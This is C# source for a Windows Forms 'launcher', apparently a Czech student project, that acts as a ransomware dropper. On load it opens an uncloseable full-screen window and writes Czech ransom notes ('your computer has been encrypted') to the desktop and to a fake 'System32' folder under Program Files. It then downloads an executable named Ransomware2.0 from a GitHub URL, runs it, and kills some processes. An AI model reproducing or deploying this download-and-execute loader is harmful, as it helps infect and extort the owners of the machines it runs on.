﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace launcher2._0
{
    public partial class launcher2 : Form
    {
        public launcher2()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; //appka nema bg
        }

        private void launcher2_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = true; //zamezi zavreni

        }

        private void launcher2_Load(object sender, EventArgs e)
        {

            Directory.CreateDirectory("C:\\Program Files\\System32"); //vytvori slozku
            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "Vas pocitac byl zasifrovan"); //vytvori textak

            this.Left = 0; //velikost 0
            this.Top = 0; //veliskot 0
            this.Width = Screen.PrimaryScreen.Bounds.Width; //velikost 0
            this.Height = Screen.PrimaryScreen.Bounds.Height; //velikost 0

            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //definuje cestu k plose
            string existfile = path_cache + @"\._cache_file.exe"; //definuje killnuti procesu
            if (!File.Exists(existfile))
            {
                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_file.exe"))
                {
                    streamWriter.WriteLine("Vas pocitac byl zasifrovan"); //text souboru
                }
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt")) //vytvori soubor
            {
                streamWriter.WriteLine("Vas pocitac byl zasifrovan"); //text souboru
            }

            ServicePointManager.Expect100Continue = true; //povoli protokol pro stahovani z githubu
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://github.com/jirilibal/maturitni_projekt/blob/main/Rasomware2.0.exe?raw=true", @"C:\Program Files\System32\Ransomware2.0.exe"); //stahne z githubu vytvoreny virus

            Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe"); //po stazeni spusti

            Process[] _process = null;
            _process = Process.GetProcessesByName("file");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

            Process[] _process2 = null;
            _process2 = Process.GetProcessesByName("._cache_file");
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }

            
        }
    }
}
